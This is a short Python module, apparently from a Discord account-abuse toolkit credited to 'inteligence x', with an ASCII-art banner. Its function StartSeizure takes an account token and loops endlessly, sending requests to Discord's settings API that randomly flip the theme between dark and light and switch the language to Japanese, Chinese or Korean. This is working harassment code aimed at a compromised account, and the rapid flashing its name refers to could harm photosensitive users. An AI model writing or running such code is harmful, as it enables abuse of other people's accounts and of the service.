###############################################################
# 
# 
#                              
# ⢿⢻⡛⡏⢏⡟⢻⡹⣛⠟⠛⡉⠛⡙⠛⢿⣏⠻⣟⢫⣟⣿⣿⡿⣝⢯⢯⣽⡻⢼
# ⢇⢧⠳⡙⠦⣘⠡⡑⢄⠊⠡⢀⠁⠄⡈⠄⢋⠗⡬⢳⣮⡽⣒⡟⣾⡹⣎⣣⠵⣸
# ⢌⢢⡑⠥⢃⡄⢣⠐⠠⠈⠄⠠⢀⠂⠠⠈⡄⢊⠑⡈⢿⠓⡰⣿⣖⡹⢳⢧⣛⢸
# ⢨⠐⡌⠘⣤⠘⢠⡌⢠⠁⡌⠐⠀⡄⠁⡎⠐⡌⠐⢠⠈⣤⠁⢻⣿⡖⠉⡎⣽⢸
# ⢀⠣⢌⣱⣤⣳⣦⣶⣌⣒⠤⣃⠔⡠⢃⠄⢣⠐⡡⠂⢌⠠⡘⢦⣿⣏⠱⠲⣍⢺
# ⣌⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢆⠑⡈⢐⠂⠱⢠⠑⣈⠶⣙⢶⣳⣮⣯⣷⣼⣸
# ⢻⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣇⠀⠂⠐⠠⠈⡐⢀⠣⢜⡸⡹⣾⣿⣿⣿⣿⣿⢿
# ⠉⢿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣷⡈⠐⠀⠀⡀⠀⠄⠂⠂⠡⡑⣿⣿⣿⣿⣿⣿⣿
# ⣍⠦⣌⢛⡛⠿⠻⠟⠛⠋⠁⠄⠐⠀⠐⣀⠐⣨⣴⣞⣦⣧⡔⡘⢿⣿⣿⣿⣿⣽
# ⢌⠲⢤⠃⢈⣤⡞⠻⣧⠀⠠⠀⠀⠂⢀⠸⠿⢿⣿⢾⣾⣿⣿⠗⠠⢉⠙⠋⣻⢻
# ⣌⠓⡎⡔⣻⡶⢫⣵⡟⠀⠀⢀⠡⠀⠆⠠⠐⣀⠚⡿⡟⢋⠠⢈⠐⡄⡈⡔⡹⢻
# ⠀⡜⢣⡸⠟⠀⠀⠟⠃⠘⠠⠀⡄⢣⠘⡤⢛⡄⣻⣸⡧⢄⠣⠄⡤⢀⠣⣘⠣⢼
# ⡐⠌⠡⠐⡀⠌⠐⠠⢈⢂⠡⢣⠜⣧⣷⣔⣣⣞⣵⣿⣿⣮⣣⠝⣤⢋⡔⢢⡱⢸
# ⠰⣈⠑⢂⠠⠐⡈⡐⠌⢢⠙⣆⢫⠴⣩⢛⡝⣫⢛⠦⣭⢙⠿⣿⠶⣍⡞⣥⢓⢸
# ⠱⠄⠎⢆⠳⡐⢄⠢⢉⠦⣙⠬⡒⡍⢦⡉⢖⡡⣋⡞⣤⢋⡞⣵⣻⣞⡼⢦⣏⣸
# 
#             
# 
###############################################################
# Crée par inteligence x
# Github: https://github.com/ix666
# Discord: https://discord.gg/jugement
# © 2022 ix
###############################################################

import requests
import random

from util.plugins.common import getheaders

def StartSeizure(token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)